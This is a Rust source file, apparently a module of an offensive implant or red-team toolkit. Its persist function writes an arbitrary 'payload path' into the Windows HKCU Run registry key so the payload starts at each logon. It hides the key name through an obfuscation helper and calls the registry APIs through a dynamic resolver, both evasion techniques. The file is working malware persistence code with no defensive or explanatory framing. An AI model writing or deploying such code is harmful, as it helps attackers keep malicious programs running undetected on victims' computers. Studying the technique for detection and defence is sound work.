use crate::log::LogSink;
#[allow(unused_imports)]
use super::{PersistConfig, PersistResult, PersistMethod};

pub fn persist(config: &PersistConfig, log: &LogSink) -> Result<PersistResult, String> {
    if config.name.is_empty() {
        return Err("value name is required".to_string());
    }
    if config.payload_path.is_empty() {
        return Err("payload path is required".to_string());
    }

    #[cfg(not(windows))]
    {
        let _ = log;
        return Err("requires Windows".to_string());
    }

    #[cfg(windows)]
    {
        use std::ffi::CString;
        use std::ptr;

        let sub_key = CString::new(crate::obf::s(crate::obf::REG_RUN_KEY))
            .map_err(|_| "invalid registry path".to_string())?;
        let value_name = CString::new(config.name.as_str())
            .map_err(|_| "invalid value name".to_string())?;
        let value_data = CString::new(config.payload_path.as_str())
            .map_err(|_| "invalid payload path".to_string())?;

        unsafe {
            let hkcu = 0x80000001u64 as *mut std::ffi::c_void;
            let mut key_handle: *mut std::ffi::c_void = ptr::null_mut();

            log.step("Step 1: Open registry key");
            let status = crate::resolve::RegOpenKeyExA(
                hkcu,
                sub_key.as_ptr() as *const u8,
                0,
                0x20006, // KEY_SET_VALUE | KEY_WRITE
                &mut key_handle,
            );
            if status != 0 {
                return Err(format!("registry key open failed: 0x{:08X}", status));
            }

            log.step("Step 2: Set registry value");
            let data_bytes = value_data.as_bytes_with_nul();
            let status = crate::resolve::RegSetValueExA(
                key_handle,
                value_name.as_ptr() as *const u8,
                0,
                1, // REG_SZ
                data_bytes.as_ptr(),
                data_bytes.len() as u32,
            );

            log.step("Step 3: Close registry key");
            crate::resolve::RegCloseKey(key_handle);

            if status != 0 {
                return Err(format!("registry value set failed: 0x{:08X}", status));
            }

            log.info(format!("  Configured: {} = {}", config.name, config.payload_path));
        }

        Ok(PersistResult {
            method: PersistMethod::RegistryRun,
            description: format!("Registry value '{}' configured", config.name),
        })
    }
}
